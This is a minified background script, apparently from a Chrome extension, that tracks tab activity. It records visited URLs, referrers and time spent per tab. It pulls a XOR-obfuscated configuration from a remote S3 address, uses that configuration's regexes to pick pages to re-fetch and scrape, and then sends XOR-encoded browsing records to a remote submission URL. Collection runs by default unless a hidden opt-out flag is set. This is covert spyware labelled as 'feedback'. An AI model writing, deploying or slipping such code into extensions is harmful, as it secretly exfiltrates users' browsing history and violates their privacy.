(function(){function e(e){for(var t=0;e.length>t;t++)try{h+=s.charAt(e[t])}catch(n){}}function t(e,t){return null==e&&(e=(new Date).getTime()),{at:0,tt:0,la:e,fa:e,u:null==t?null:t.url,t:[]}}function n(e){var n=(new Date).getTime(),r=v[""+e.id];null==r?r=t(n,e):(r.at=0,r.tt=0,r.la=n,r.fa=n,null==r.u&&(r.u=null==e?null:e.url)),null!=e&&(v[""+e.id]=r)}function r(){var e=[];chrome.tabs.query({},function(t){t.forEach(function(t){e[""+t.id]=1});for(tabId in v)null==e[tabId]&&delete v[tabId];for(windowId in p)null==e[""+p[windowId]]&&delete p[windowId]})}function a(e){if(!b){if(null==e)return;var t=e.u,n=(new Date).getTime();if(null!=t&&0==t.indexOf("http")&&e.t.length>0){null!=e.la&&(e.at+=n-e.la);var r=n-e.fa,a=[];e.t.forEach(function(e){null!=e&&e!==void 0&&a.push(e)}),u({u:t,at:""+e.at,tt:""+r,t:a,eid:s})}}b=!1}function o(e){var t="";if(null!=e)for(i=0;e.length>i;i++){var n=e.charCodeAt(i),r=385^n;t+=String.fromCharCode(r)}return t}function u(e){if(!w(localStorage.feedbackOptOut)){var t=new XMLHttpRequest;t.open("POST",m,!0),t.setRequestHeader("Content-type","application/x-www-form-urlencoded"),t.send("d="+encodeURIComponent(o(JSON.stringify(e))))}}function l(e){chrome.webRequest.onHeadersReceived.addListener(function(n){if(!w(localStorage.feedbackOptOut)&&-1!=n.tabId){for(var r=null,a=0;n.responseHeaders.length>a;a++){var i=n.responseHeaders[a].name;if("content-type"==i.toLowerCase())r=n.responseHeaders[a].value;else if("Referer"==i)for(var o=n.responseHeaders[a],u=0;g.br.length>a;u++)if(o.indexOf(br[u])>=0)return}var l=null;e.ctm1&&(l=RegExp(e.ctm1,"i")),(!e.ctm1||null!=r&&l.test(r))&&([n.url,""],chrome.tabs.get(n.tabId,function(r){var a="";chrome.tabs.getSelected(null,function(i){a=i.url;var o=n.url.toLowerCase();if(e.fm1&&""!=e.fm1){var u=RegExp(e.fm1,"i");if(!u.test(o))return}if(e.fm2&&""!=e.fm2){var l=RegExp(e.fm2,"i");if(!l.test(o))return}if(e.fnm1&&""!=e.fnm1){var d=RegExp(e.fnm1,"i");if(d.test(o))return}c(n.url,e,function(i,o){var u=v[""+n.tabId];null==u&&(u=t()),u.t.push({aid:e.aid,ct:e.ct,t:e.t,tu:null!=r?r.url:null,u:n.url,ts:Math.round(n.timeStamp)+"",atu:a,a:i,lp:o}),v[""+n.tabId]=u})})}))}},{urls:["*://"+(0==e.d.indexOf(".")?"*"+e.d:e.d)+"/*"]},["responseHeaders"])}function d(){if(!w(localStorage.feedbackOptOut)){var e=new XMLHttpRequest;e.open("GET","https://s3.amazonaws.com/plugin-feedback/config.7",!0),e.onreadystatechange=function(){if(4==e.readyState){g=JSON.parse(o(e.responseText));for(var t=0;g.br.length>t;t++){var n=g.br[t];chrome.webRequest.onBeforeSendHeaders.addListener(function(){b=!0},{urls:["*://"+(0==n.indexOf(".")?"*"+n:n)+"/*"]},["requestHeaders"])}for(var t=0;g.config.length>t;t++)m=g.submissionUrl,l(g.config[t])}},e.send()}}function f(e,t){var n="",r=RegExp(e,"i"),a=t.match(r);return a&&a.length>1?n=a[1]:a&&a.length>0&&(n=a[0]),n}function c(e,t,n){if(!w(localStorage.feedbackOptOut)){if(0==t.ppl)return n(),void 0;for(i=0;t.ur.length>i;i++){var r=RegExp(t.ur[i].sr,"i");e=e.replace(r,t.ur[i].rs)}var a=new XMLHttpRequest;a.open("GET",e,!0),a.onreadystatechange=function(){if(4==a.readyState){var e=a.responseText,r="",i="";if(t.ar){var r=f(t.ar,e);r&&0!=r.length||(r=f(t.ar2,e))}if(t.lr){var i=f(t.lr,e);i&&0!=i.length||(i=f(t.lr2,e))}""!=r&&""!=i&&n(r,i)}},a.send()}}var s=chrome.i18n.getMessage("@@extension_id"),h="",v=[],p=[],m=null,g=null,b=!1,w=function(e){"use strict";return"false"===e.toLowerCase()?!1:"true"===e.toLowerCase()?!0:e};e([3,7,9,4,14,17,10,15]),chrome.tabs.onDetached.addListener(function(e,t){delete p[""+t.oldWindowId]}),chrome.tabs.onAttached.addListener(function(e,t){p[""+t.newWindowId]=e}),chrome.tabs.onCreated.addListener(function(e){r(),n(e)}),chrome.tabs.onActivated.addListener(function(e){var n=(new Date).getTime(),r=p[""+e.windowId];if(null!=r){var a=v[""+r];null!=a&&(a.at+=n-a.la,a.la=null)}p[""+e.windowId]=e.tabId,null==v[""+e.tabId]?v[""+e.tabId]=t(n):v[""+e.tabId].la=n}),chrome.tabs.onReplaced.addListener(function(e,t){var r=v[""+t];a(r),delete v[""+t],chrome.tabs.get(e,function(e){n(e)})}),chrome.tabs.onUpdated.addListener(function(e,n,r){var o=n.url;if(null!=o&&0==o.indexOf("http")){var u=(new Date).getTime(),l=v[""+e];if(null!=l){if("chrome://newtab/"==l.u)return l.u=o,void 0;var d=[];for(i=0;l.t.length>i;i++){var f=l.t[i];null==f.tu?(f.tu=l.u,f.atu=l.u,l.t[i]=f):l.u!=l.t[i].tu&&(d.push(l.t[i]),delete l.t[i])}a(l);var c=t(u,r);c.t=d,v[""+e]=c}}}),chrome.tabs.onRemoved.addListener(function(e){var t=v[""+e];a(t),delete v[""+e]});var I=w(localStorage.feedbackOptOut);I||d()})();